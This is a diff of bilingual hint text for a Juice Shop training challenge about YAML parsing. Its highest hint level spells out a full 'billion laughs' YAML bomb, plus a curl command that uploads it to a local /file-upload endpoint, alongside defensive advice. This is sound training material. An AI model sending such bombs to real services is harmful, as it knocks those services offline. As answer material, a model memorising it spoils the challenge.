@@ -54,58 +54,65 @@ hints:
   N4:
     cost_pct: 35
     text_fr: |
-      Crafter bomb.yml avec 9 niveaux d'anchors. Upload via /#/complain.
-      Le parser js-yaml essaie d'expand les references et timeout
-      (Script execution timed out). Le serveur fileUpload.ts:123-124
-      detecte et solve.
+      Le serveur parse les .yml/.yaml uploades dans un bac a sable avec
+      un timeout de 2000 ms (routes/fileUpload.ts, handleYamlUpload).
+      Une "YAML bomb" (billion laughs) utilise des ancres imbriquees
+      dont l'expansion est exponentielle : le parseur depasse le timeout
+      et leve "Script execution timed out", ce qui resout le challenge.
+      Pre-requis : deprecatedInterfaceChallenge actif (upload de fichiers
+      legacy).
     text_en: |
-      Craft bomb.yml with 9 anchor levels. Upload via /#/complain. The
-      js-yaml parser tries to expand references and times out (Script
-      execution timed out). Server fileUpload.ts:123-124 detects and
-      solves.
+      The server parses uploaded .yml/.yaml in a sandbox with a 2000 ms
+      timeout (routes/fileUpload.ts, handleYamlUpload). A "YAML bomb"
+      (billion laughs) uses nested anchors whose expansion is
+      exponential: the parser exceeds the timeout and raises "Script
+      execution timed out", which solves the challenge. Prerequisite:
+      deprecatedInterfaceChallenge enabled (legacy file upload).
     pedagogical_intent: |
-      Spell exact action.
+      Explain the exponential-anchor DoS and the timeout trigger.
 
   N5:
     cost_pct: 50
     text_fr: |
-      Workflow : (1) Crafter bomb.yml :
-      ```yaml
-      a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol","lol"]
-      b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]
-      c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b, *b]
-      d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c, *c]
-      e: &e [*d, *d, *d, *d, *d, *d, *d, *d, *d, *d]
-      f: &f [*e, *e, *e, *e, *e, *e, *e, *e, *e, *e]
-      g: &g [*f, *f, *f, *f, *f, *f, *f, *f, *f, *f]
-      h: &h [*g, *g, *g, *g, *g, *g, *g, *g, *g, *g]
-      i: &i [*h, *h, *h, *h, *h, *h, *h, *h, *h, *h]
-      ```
-      (2) /#/complain > attach bomb.yml > Submit. (3) Serveur parse YAML,
-      js-yaml expand 10^9 occurrences, timeout fire. (4) fileUpload.ts:123
-      `if (notSolved(yamlBombChallenge)) solve(yamlBombChallenge)`. (5)
-      Notification "Solved Memory Bomb". Defense : `js-yaml safeLoad` ou
-      `SAFE_SCHEMA`, limite anchor depth, JSON Schema post-parse, file
-      size limit. JAMAIS load() default. Source : fileUpload.ts:123-124.
+      Solution (verifiee en recette sur Juice Shop 19.2.1, sans auth) :
+      cree bomb.yml avec des ancres imbriquees (expansion exponentielle) :
+        a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
+        b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
+        c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
+        d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
+        e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
+        f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
+        g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
+        h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
+        i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
+        bomb: *i
+      Puis upload :
+        curl -s -X POST http://127.0.0.1:3000/file-upload -F "file=@bomb.yml"
+      Reponse 503 apres ~2 s (timeout), challenge resolu
+      (fileUpload.ts:124). Le formulaire /#/complain fait le meme POST
+      /file-upload.
+      Defense : limiter la taille/profondeur des documents YAML,
+      desactiver l'expansion d'ancres non bornee, et plafonner le temps
+      de parsing.
     text_en: |
-      Workflow: (1) Craft bomb.yml:
-      ```yaml
-      a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol","lol"]
-      b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]
-      c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b, *b]
-      d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c, *c]
-      e: &e [*d, *d, *d, *d, *d, *d, *d, *d, *d, *d]
-      f: &f [*e, *e, *e, *e, *e, *e, *e, *e, *e, *e]
-      g: &g [*f, *f, *f, *f, *f, *f, *f, *f, *f, *f]
-      h: &h [*g, *g, *g, *g, *g, *g, *g, *g, *g, *g]
-      i: &i [*h, *h, *h, *h, *h, *h, *h, *h, *h, *h]
-      ```
-      (2) /#/complain > attach bomb.yml > Submit. (3) Server parses
-      YAML, js-yaml expands 10^9 occurrences, timeout fires. (4)
-      fileUpload.ts:123 `if (notSolved(yamlBombChallenge)) solve
-      (yamlBombChallenge)`. (5) "Solved Memory Bomb" notification.
-      Defense: `js-yaml safeLoad` or `SAFE_SCHEMA`, limit anchor depth,
-      JSON Schema post-parse, file size limit. NEVER default load().
-      Source: fileUpload.ts:123-124.
+      Solution (verified during testing on Juice Shop 19.2.1, no auth):
+      create bomb.yml with nested anchors (exponential expansion):
+        a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
+        b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
+        c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
+        d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
+        e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
+        f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
+        g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
+        h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
+        i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
+        bomb: *i
+      Then upload:
+        curl -s -X POST http://127.0.0.1:3000/file-upload -F "file=@bomb.yml"
+      Response 503 after ~2 s (timeout), challenge solved
+      (fileUpload.ts:124). The /#/complain form does the same POST
+      /file-upload.
+      Defense: limit YAML document size/depth, disable unbounded anchor
+      expansion, and cap parsing time.
     pedagogical_intent: |
-      Solution + canonical fix.
+      Full verified solution: bomb YAML, exact endpoint, defense.
